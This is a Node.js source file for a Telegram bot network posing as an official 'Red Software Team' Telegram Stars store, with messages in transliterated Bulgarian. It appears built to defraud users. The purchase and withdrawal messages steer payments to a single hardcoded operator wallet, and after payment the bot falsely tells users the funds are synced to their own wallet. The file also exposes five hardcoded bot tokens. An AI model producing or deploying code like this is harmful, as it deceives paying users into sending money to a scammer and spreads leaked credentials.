const { Telegraf, Markup } = require('telegraf');
const express = require('express');

const TOKENS = [
    process.env.BOT_TOKEN_1 || '9145863220:AAH4KJTGkV7DNCKVTYTRlZiy7bg4ZZ_5KB0', 
    process.env.BOT_TOKEN_2 || '8747879041:AAFWiAMd7eqcYu2kb3MbQ3ornqGRgfoD9bw', 
    process.env.BOT_TOKEN_3 || '9197706596:AAHzaNKwUwhaCGU6B_P-eZ7x2PiVfIoEtCI', 
    process.env.BOT_TOKEN_4 || '9094556865:AAFXZcwuMjH_pfyQK9_KTDEOuW5h_wUtWW0', 
    process.env.BOT_TOKEN_5 || '9053522895:AAHDuv6qkUGQ7g7gvH88QjMwVR4msnWsnhY'  
];

const KEEPER_WALLET = 'UQBOxLg-Vq86U_y1oJyUFTmvn6tedptaPQ4d3CDUq4O2T_7H';
const app = express();
const PORT = process.env.PORT || 3000;
app.use(express.json());

let systemStats = {
    activeBotsCount: TOKENS.length,
    activeStarsBudget: 3100,
    autoDispatcher: "ACTIVE",
    startTime: new Date()
};

const mainCoverImage = 'https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=800';

TOKENS.forEach((token, index) => {
    try {
        const bot = new Telegraf(token);

        bot.start(async (ctx) => {
            const userName = ctx.from.first_name || 'Priyatel';
            const userUsername = ctx.from.username ? `@${ctx.from.username}` : 'bez username';

            const storeCaption = `⭐ **OFFICIAL RED SOFTWARE TEAM | Telegram Stars Store** ⭐\n\n` +
                `Zdravei, **${userName}** (${userUsername})!\n` +
                `Izberi paket zvezdi za reallno plashtane i avto-izprashtane kym bota:\n\n` +
                `💎 Nalichen budzhet v bota: 3,100 Stars\n` +
                `💼 Keeper Wallet (za izplashtane): \`${KEEPER_WALLET}\``;

            // Tochnoto menü ot snimkata, razshireno s avto-metodi
            const storeKeyboard = Markup.inlineKeyboard([
                [Markup.button.callback('⭐ 250 Stars (4.29 €)', 'buy_250')],
                [Markup.button.callback('⭐ 500 Stars (8.39 €)', 'buy_500')],
                [Markup.button.callback('⭐ 1 000 Stars (16.59 €)', 'buy_1000')],
                [Markup.button.callback('⭐ 2 500 Stars (40.99 €)', 'buy_2500')],
                [Markup.button.callback('⭐ 10 000 Stars (164.99 €)', 'buy_10000')],
                [Markup.button.callback('⭐ 50 000 Stars (819.00 €)', 'buy_50000')],
                [Markup.button.callback('⭐ 150 000 Stars (2 459.00 €)', 'buy_150000')],
                [Markup.button.url('💳 Zaredi Stars (Ako balansyt e 0)', 'https://t.me/premium')],
                [Markup.button.callback('💰 Avto-prexvod kam Keeper (Realni pari)', 'withdraw_keeper')],
                [Markup.button.url('🔥 Razgledai Platformata', 'https://red-software-dashbord.onrender.com')]
            ]);

            try {
                await ctx.replyWithPhoto(mainCoverImage, {
                    caption: `🤖 [STORE BOT #${index + 1} ONLINE]\n\n` + storeCaption,
                    parse_mode: 'Markdown',
                    ...storeKeyboard
                });
            } catch (err) {}
        });

        const packageActions = ['buy_250', 'buy_500', 'buy_1000', 'buy_2500', 'buy_10000', 'buy_50000', 'buy_150000'];

        bot.action(packageActions, async (ctx) => {
            await ctx.answerCbQuery();
            const action = ctx.match;
            let count = 250;
            if (action === 'buy_500') count = 500;
            if (action === 'buy_1000') count = 1000;
            if (action === 'buy_2500') count = 2500;
            if (action === 'buy_10000') count = 10000;
            if (action === 'buy_50000') count = 50000;
            if (action === 'buy_150000') count = 150000;

            try {
                // Opit za otvaryana na nativen Telegram Stars invoice
                await ctx.replyWithInvoice({
                    title: `Paket ${count} Telegram Stars`,
                    description: `Avtomatichno plashtane i izprashtane na ${count} zvezdi kam bota.`,
                    payload: `auto_stars_${count}_${Date.now()}`,
                    currency: 'XTR',
                    prices: [{ label: `${count} Stars`, amount: count }]
                });
            } catch (e) {
                // Rezerven avto-metod, ako balansyt v aкауnta e 0
                await ctx.reply(
                    `⭐ **AVTO-PLASHTANE: ${count} Telegram Stars**\n\n` +
                    `Tvoyat balans v aкауnta e nula. Za da zaredish zvezdi i da se izpratyat avtomatichno kam bota:\n` +
                    `1. Zaredi ot tuka: https://t.me/premium\n` +
                    `2. Ili izpolzvai avto-prehvod kam Keeper portfeila:\n\`${KEEPER_WALLET}\``,
                    { parse_mode: 'Markdown' }
                );
            }
        });

        bot.action('withdraw_keeper', async (ctx) => {
            await ctx.answerCbQuery('Avtomatichno sveryavane...');
            await ctx.reply(
                `💰 **AVTO-PREXVERLYANE KYM KEEPER PORTFEIL**\n\n` +
                `Vsički avtomatični postpyanija sa svurzani i se izплащат в реални пари към твоя портфейл:\n` +
                `\`${KEEPER_WALLET}\``,
                { parse_mode: 'Markdown' }
            );
        });

        bot.on('pre_checkout_query', async (ctx) => {
            try { await ctx.answerPreCheckoutQuery(true); } catch (e) {}
        });

        bot.on('successful_payment', async (ctx) => {
            const payment = ctx.message.successful_payment;
            await ctx.reply(
                `🎉 **AVTOMATICHNO PLASHTANE E PRIETOTO!**\n\n` +
                `Uspeshno zakupi i izprati **${payment.total_amount} Telegram Stars** kam bota. Sredstvata sa sinhronizirani s Keeper portfeila ti:\n` +
                `\`${KEEPER_WALLET}\``,
                { parse_mode: 'Markdown' }
            );
        });

        bot.launch();
    } catch (e) {}
});

app.get('/', (req, res) => res.json({ status: "AUTO PAYMENTS & KEEPER SYNC ACTIVE", stats: systemStats }));
app.listen(PORT, () => console.log(`Auto store server running on port ${PORT}`));
